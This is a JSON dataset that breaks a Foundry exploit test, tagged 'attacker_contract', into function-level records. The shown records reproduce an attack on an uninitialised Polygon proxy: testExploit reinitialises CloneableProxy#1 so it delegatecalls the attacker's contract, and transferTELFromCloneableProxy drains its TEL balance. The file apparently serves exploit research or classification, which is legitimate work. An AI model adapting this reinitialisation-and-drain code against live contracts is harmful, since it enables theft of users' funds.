[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "implementation",
    "original_code": "    function implementation() external view returns (address) {\n        return address(this);\n    }\n\n    // Function will be delegatecalled from CloneableProxy#1\n    // Transfer only TEL because victim proxy doesn't have LINK balance\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"polygon\", 51_546_495);\n        vm.label(address(CloneableProxy), \"CloneableProxy#1\");\n        vm.label(address(TEL), \"TEL\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker TEL balance before exploit\", TEL.balanceOf(address(this)), TEL.decimals());\n        bytes32 cloneableProxyPackedSlot0 = vm.load(address(CloneableProxy), bytes32(uint256(0)));\n        console.log(\"----------------------------------------------------------------\");\n        emit log_named_bytes32(\n            \"CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization\",\n            cloneableProxyPackedSlot0\n        );\n        console.log(\"----------------------------------------------------------------\");\n        console.log(\n            \"CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s\",\n            uint8(cloneableProxyPackedSlot0[30]),\n            uint8(cloneableProxyPackedSlot0[31])\n        );\n        console.log(\"----------------------------------------------------------------\");\n        console.log(\"---Exploit Time---\");\n\n        bytes memory data = abi.encodePacked(this.transferTELFromCloneableProxy.selector);\n        CloneableProxy.initialize(address(this), data);\n\n        cloneableProxyPackedSlot0 = vm.load(address(CloneableProxy), bytes32(uint256(0)));\n        console.log(\"----------------------------------------------------------------\");\n        emit log_named_bytes32(\n            \"CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization\",\n            cloneableProxyPackedSlot0\n        );\n        console.log(\"----------------------------------------------------------------\");\n        console.log(\n            \"CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s\",\n            uint8(cloneableProxyPackedSlot0[30]),\n            uint8(cloneableProxyPackedSlot0[31])\n        );\n        console.log(\"----------------------------------------------------------------\");\n        emit log_named_decimal_uint(\"Attacker TEL balance after exploit\", TEL.balanceOf(address(this)), TEL.decimals());\n\n        // Sanity test after exploit\n        vm.expectRevert(\"Initializable: contract is already initialized\");\n        CloneableProxy.initialize(address(this), \"\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "transferTELFromCloneableProxy",
    "original_code": "    function transferTELFromCloneableProxy() external {\n        TEL.transfer(msg.sender, TEL.balanceOf(address(CloneableProxy)));\n    }\n",
    "description": ""
  }
]